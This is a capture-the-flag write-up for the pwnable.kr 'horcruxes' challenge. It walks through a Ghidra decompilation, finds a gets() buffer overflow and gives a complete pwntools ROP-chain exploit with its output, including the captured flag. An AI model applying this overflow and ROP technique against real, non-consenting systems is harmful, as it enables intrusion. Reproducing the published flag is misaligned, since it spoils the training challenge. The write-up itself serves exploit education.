# horcruxes
This the first time we are building a rop chain!

## Recon
This challenge has no source code. we only get a binary, and a `readme` file:
```sh
cat readme
# connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege. rop it to read the flag.
```
its just telling us to exploit it we can connect to port 9032 - not helpful.

before running into reversing the binary in `ghidra`, we must take a look at the symbols!
```bash
nm horcruxes
```
there is a function called `ropme` at the address `0x080a0009` - I think we found a fun function! let's dive into `ghidra`.

## `Ghidra`
#### overview:
`ghidra` is a reverse-engineering program (built by the NSA!) allowing us the de-compile any binary file we want, and get a C code which representing our binary!
#### recon:
Let's follow the path of the functions:
- `main`
	- `hint`
- `main`
	- `init_ABCDEFG`
- `main`
	- `seccomp` - allowing nothing but `read`,`write` and `open`
- `main`
	- `ropme`

Let's go one by one.
##### `hint`
this function is only printing shit to the screen.

##### `init_ABCDEFG`
This function is filling random values on the:
- a
- b
- c
- d
- e
- f
- g

variables - and summing them up into another variable called `sum`.
##### `ropme`
This function is the most interesting. Let's look at the source code (generated by `ghidra`):
```C
undefined4 ropme(void)
{
   int int_of_buf;
   ssize_t bytes_read;
   char buf [100];
   int input;
   int flag_fd;
   
   printf("Select Menu:");
   __isoc99_scanf(&"%D",&input);
   getchar();
   if (input == a__RANDOM_EVERY_RUN) {
      A();
   }
   else if (input == b__RANDOM_EVERY_RUN) {
      B();
   }
   else if (input == c__RANDOM_EVERY_RUN) {
      C();
   }
   else if (input == d__RANDOM_EVERY_RUN) {
      D();
   }
   else if (input == e__RANDOM_EVERY_RUN) {
      E();
   }
   else if (input == f__RANDOM_EVERY_RUN) {
      F();
   }
   else if (input == g__RANDOM_EVERY_RUN) {
      G();
   }
   else {
      printf("How many EXP did you earned? : ");
      gets(buf);
      int_of_buf = atoi(buf);
      if (int_of_buf == sum) {
         flag_fd = open("flag",0);
         bytes_read = read(flag_fd,buf,100);
         buf[bytes_read] = '\0';
         puts(buf);
         close(flag_fd);
                               /* WARNING: Subroutine does not return */
         exit(0);
      }
      puts("You\'d better get more experience to kill Voldemort");
   }
   return 0;
}
```
**I changed some variables name to make it readable.**
The flow of the function is:
- number as input
- check if the number is equals to A or B or C... (which are all random)
	- if it is call the A() or B() or C()... functions
- if not, take an input (we can see we have a buffer overflow into `buf` via a `gets` call!)
- convert the `buf` into an `int`
- check if the `int` is the `sum` (calculated via A+B+C... in the `init_ABCDEFG` function)
	- print the flag
- exit

Because the challenge called `ropme` I know I will need to build a rop-chain. A `ropchain` is basically jumping from function to function until we get what we need. in this example (without even checking) I can tell that the `A()` function will leak the value of `A`:
```C
void A(void)
{
   printf("You found \"Tom Riddle\'s Diary\" (EXP +%d)\n",a__RANDOM_EVERY_RUN);
   return;
}
```
I was right!
We can build a rop chain that executing:
- `A`
- `B`
- `C`
- `D`
- `E`
- `F`
- `G`
- `ropme`
We should get a leak of all the values, and calling `ropme` again will let us to fill the sum of all of them and to get the flag!

## Exploit
After some good old `pwn cyclic` I found out that I can override the return address of `ropme` after `120` bytes.
I tried changing it to be the address of the `ropme` function itself, but it has a null byte: `0x080a0009`. So instead I used the `0x0809fffc` which the address where `main` is calling the `ropme` function.
This is the final exploit:
```python
import sys
from pwn import *

p = remote('pwnable.kr', 9032)

func_ropme_addr = p32(0x0809fffc)
func_A_addr = p32(0x0809FE4B)
func_B_addr = p32(0x0809FE6A)
func_C_addr = p32(0x0809FE89)
func_D_addr = p32(0x0809FEA8)
func_E_addr = p32(0x0809FEC7)
func_F_addr = p32(0x0809FEE6)
func_G_addr = p32(0x0809FF05)

p.recvuntil(b"Select Menu:")
p.sendline(b"1")
payload = b''
payload += b'A'*120
payload += func_A_addr
payload += func_B_addr
payload += func_C_addr
payload += func_D_addr
payload += func_E_addr
payload += func_F_addr
payload += func_G_addr
payload += func_ropme_addr
p.sendline(payload)
p.readline()

total = 0
x = int(p.readline().split(b"+")[-1][:-2].decode())
print("Current Number:", x)
total += x
print("Sum:", total)
x = int(p.readline().split(b"+")[-1][:-2].decode())
print("Current Number:", x)
total += x
print("Sum:", total)
x = int(p.readline().split(b"+")[-1][:-2].decode())
print("Current Number:", x)
total += x
print("Sum:", total)
x = int(p.readline().split(b"+")[-1][:-2].decode())
print("Current Number:", x)
total += x
print("Sum:", total)
x = int(p.readline().split(b"+")[-1][:-2].decode())
print("Current Number:", x)
total += x
print("Sum:", total)
x = int(p.readline().split(b"+")[-1][:-2].decode())
print("Current Number:", x)
total += x
print("Sum:", total)
x = int(p.readline().split(b"+")[-1][:-2].decode())
print("Current Number:", x)
total += x
print("Sum:", total)

p.recvuntil(b"Select Menu:")
p.sendline(b"1")
p.sendline(str(total).encode())
p.interactive()
```
The results:
```
[+] Opening connection to pwnable.kr on port 9032: Done
Current Number: -1375120578
Sum: -1375120578
Current Number: 498379515
Sum: -876741063
Current Number: 863877661
Sum: -12863402
Current Number: -1117703825
Sum: -1130567227
Current Number: 153290099
Sum: -977277128
Current Number: 1403203644
Sum: 425926516
Current Number: -1149771087
Sum: -723844571
[*] Switching to interactive mode
How many EXP did you earned? : Magic_spell_1s_4vad4_K3daVr4!
```
Good Game!